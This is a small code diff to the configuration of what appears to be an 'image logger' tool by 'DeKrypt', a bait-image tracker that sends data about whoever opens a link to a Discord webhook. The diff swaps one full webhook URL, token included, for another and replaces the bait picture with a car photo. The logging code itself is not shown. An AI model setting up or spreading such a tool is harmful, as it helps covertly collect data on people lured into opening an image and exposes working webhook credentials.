@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1347220910796705802/qTk54a9Sf3zMHbxd-I3ufjzJhoqUYYmDGTRp-9uHvPmR7Y7E7MFkfbcxPkf1Y0CVSpBU",
-    "image": "https://as2.ftcdn.net/jpg/00/24/66/63/1000_F_24666342_ETDfJ4UhpxVXJ0gxYzsPmd4RijU6ZUPd.jpghttps://as2.ftcdn.net/jpg/00/24/66/63/1000_F_24666342_ETDfJ4UhpxVXJ0gxYzsPmd4RijU6ZUPd.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1352982564717203466/TO2Fr_UYj2IsauMNg2EullRLnjS4bVaKJEZ_BcnUNFIAD-0V7ew34xzPFClrUlz7pB1q",
+    "image": "https://newsroom.porsche.com/.imaging/mte/porsche-templating-theme/image_1080x624/dam/pnr/2024/Products/992-II/0840_nevada_coupe_u-crane_AKOS0607_edit_V03-sky.jpg/jcr:content/0840_nevada_coupe_u-crane_AKOS0607_edit_V03-sky.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
